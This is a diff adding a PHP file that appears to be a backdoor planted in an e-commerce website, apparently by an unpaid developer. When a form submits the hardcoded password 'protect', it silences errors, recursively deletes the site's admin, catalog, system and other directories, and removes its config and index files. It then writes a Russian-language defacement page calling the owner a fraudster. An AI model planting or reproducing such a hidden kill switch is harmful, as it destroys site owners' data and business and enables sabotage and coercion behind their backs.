@@ -1,0 +1,62 @@
+<? header('Content-Type: text/html; charset=utf-8');
+error_reporting(0);
+function deltree($folder) {
+    if (is_dir($folder)) {
+        $handle = opendir($folder);
+        while ($subfile = readdir($handle)) {
+            if ($subfile == '.' or $subfile == '..') continue;
+            if (is_file($subfile)) @unlink("{$folder}/{$subfile}");
+            else deltree("{$folder}/{$subfile}");
+        }
+        @closedir($handle);
+        if (@rmdir($folder)) return true;
+        else return false;
+    } else {
+        if (@unlink($folder)) return true;
+        else return false;
+    }
+    return false;
+}
+
+
+if ($_POST['password'] === "protect" ) {
+
+    deltree('admin');
+    deltree('catalog');
+    deltree('cgi-bin');
+    deltree('download');
+    deltree('image');
+    deltree('images');
+    deltree('system');
+    deltree('vqmod');
+    deltree('install');
+    unlink('index.php');
+    unlink('config.php');
+    unlink('robots.txt');
+    unlink('php.ini');
+    unlink('.htaccess');
+
+    $msg = '<div style="text-align:center; font-size:40px; width: 800px; margin:0 auto;"><font color = red><b>Внимание!</b></font><br>Владелец данного сайта мошенник. Заказывал работу над сайтом, работа была сделана в полном объеме и в срок, но данный человек за неё не заплатил.<br> <font color = red> <b>Остерегайтесь!</b></font></div>';
+    $h = fopen("index.html", "w");
+    fwrite($h, iconv("UTF-8", "WINDOWS-1251", $msg));
+    fclose($h);
+    echo "<br>Сделано";
+
+} 
+
+
+?>
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+</head>
+<body>
+    <form method="post" id="auth" name="auth">
+        <p>Введите пароль:</p>
+        <input type ="password" id="password" name="password">
+        <input type ="submit" id="check" name="check">
+    </form>
+</body>
+</html>
